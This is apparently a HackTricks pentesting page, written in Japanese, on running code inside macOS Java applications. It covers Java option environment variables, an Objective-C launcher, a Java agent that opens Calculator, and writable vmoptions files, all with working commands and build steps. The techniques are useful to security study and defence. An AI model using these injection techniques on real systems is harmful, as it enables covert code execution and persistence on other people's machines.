# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 列挙

システムにインストールされている Java アプリケーションを探します。**Info.plist** 内の Java アプリには、文字列 **`java.`** を含む Java パラメータが存在することが確認されているため、次のように検索できます。
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

環境変数 **`_JAVA_OPTIONS`** は、Java application の起動時に任意の Java VM パラメータを inject するために使用できます。<sup>[[1]](#references)</sup>

Java の launch stack は、scope が異なる、より明確に定義された 2 つの変数も認識します。

- `JAVA_TOOL_OPTIONS` は VM の作成時に読み込まれます。これには、`java` launcher を経由しない一部の embedded launch path も含まれます。`-javaagent`、`-agentlib`、`-agentpath` などの instrumentation option を inject できます。<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` は `java` launcher によって command line の先頭に追加されます。main class を選択する option や launcher を終了させる optionは禁止されていますが、`-javaagent` は受け入れられます。<sup>[[5]](#references)</sup>

攻撃者が、互換性のある読み取り可能な agent も提供できる場合、これら 3 つの変数はすべて JVM code-execution control として扱う必要があります。`_JAVA_OPTIONS` は HotSpot の implementation detail であるため、正確な vendor と version に対して検証してください。portable testing には `JAVA_TOOL_OPTIONS` または `JDK_JAVA_OPTIONS` の使用が推奨されます。
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
現在の terminal の子プロセスではなく、新しいプロセスとして実行するには、次を使用できます:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
ただし、その手法は実行されたアプリケーションでエラーを引き起こします。よりステルス性の高い代替手段は、Java agentを作成して `-javaagent` を使用することです。<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> アプリケーションとは**異なる Java バージョン**で agent を作成すると、agent とアプリケーションの両方がクラッシュする可能性があります。

agent は次の場所に存在できます：
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
エージェントをコンパイルするには、次を実行します：
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
`manifest.txt` を使用する場合:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
そして、env variable を export し、次のように Java application を実行します:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions ファイル

このファイルでは、Java の実行時に使用する **Java パラメータ**を指定できます。以前の手法の一部を使用して Java パラメータを変更し、**プロセスに任意のコマンドを実行させる**ことができます。\
さらに、このファイルでは `include` ディレクティブを使用して**他のファイルを含める**こともできるため、インクルードされたファイルを変更することもできます。

さらに、一部の Java アプリは複数の `vmoptions` ファイルを**読み込みます**。

Android Studio などの一部のアプリケーションでは、これらのファイルを**探す場所が出力に示されます**:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
存在しない場合は、次のコマンドで確認できます：
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
この例では、Android Studio が **`/Applications/Android Studio.app.vmoptions`** の読み込みを試みていることに注目してください。この場所には、**`admin` グループのすべてのユーザーが書き込みアクセス権を持っています**。

## References

- [1] [OpenJDK — `arguments.cpp` における `_JAVA_OPTIONS` の解析](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — `java.lang.instrument` パッケージ仕様](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — JVM options と platform properties の設定](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [`java` launcher — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
